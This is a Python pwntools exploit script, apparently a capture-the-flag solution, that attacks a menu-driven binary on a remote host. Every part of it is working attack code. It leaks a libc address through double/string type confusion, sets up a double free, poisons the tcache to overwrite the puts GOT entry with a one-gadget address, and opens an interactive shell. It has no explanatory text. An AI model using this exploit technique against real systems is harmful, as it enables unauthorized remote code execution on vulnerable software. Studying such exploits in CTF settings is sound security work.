from pwn import *

#R = process('./chall')
R = remote("13.231.207.73", 9007)

def to_lf(x):
    return str(struct.unpack("<d",struct.pack("<q",x))[0])

def add(r, t, v):
    r.sendlineafter("> ", "1")
    r.sendlineafter("Type(long=1/double=2/str=3):", str(t))
    r.sendlineafter("Data:", v)

def get(r, i, t):
    r.sendlineafter("> ", "2")
    r.sendlineafter("Index:", str(i))
    r.sendlineafter("Type(long=1/double=2/str=3):", str(t))
    r.recvuntil("Data: ")
    return r.recvline()[:-1]

def edit(r, i, t, v):
    r.sendlineafter("> ", "3")
    r.sendlineafter("Index:", str(i))
    r.sendlineafter("Type(long=1/double=2/str=3):", str(t))
    r.sendlineafter("Data:", v)

def del_(r, i):
    r.sendlineafter("> ", "4")
    r.sendlineafter("Index:", str(i))

def leak_libcbase(r):
    puts_bss = 0x602018
    puts_offset = 0x809c0
    add(r, 2, to_lf(puts_bss))
    libc_puts = u64(get(r, 0, 3).ljust(8, b'\x00'))
    return libc_puts - puts_offset

def get_doublefreed(r):
    add(r, 3, p64(0xdeadbeef))
    # using more smaller bytes than 8, so used long (=>get(r, 1, 1))
    return int(get(r, 1, 1))

def set_doublefree(r, double_freed):
    add(r, 2, to_lf(double_freed))
    del_(r, 1)
    del_(r, 1)

def run_onegadget(r, libc_base, overwritten):
    onegadget_offset = 0x10a38c
    one_gadget = libc_base + onegadget_offset
    add(r, 3, p64(overwritten))
    add(r, 3, p64(0xdeadbeef))
    add(r, 3, p64(one_gadget))
    r.interactive()

def tcache_poisoning(r, libc_base, double_freed):
    set_doublefree(r, double_freed)
    puts_bss = 0x602018
    run_onegadget(r, libc_base, puts_bss)

def main(r):
    libc_base = leak_libcbase(r)
    double_freed = get_doublefreed(r)
    tcache_poisoning(r, libc_base, double_freed)

if __name__ == '__main__':
    main(R)
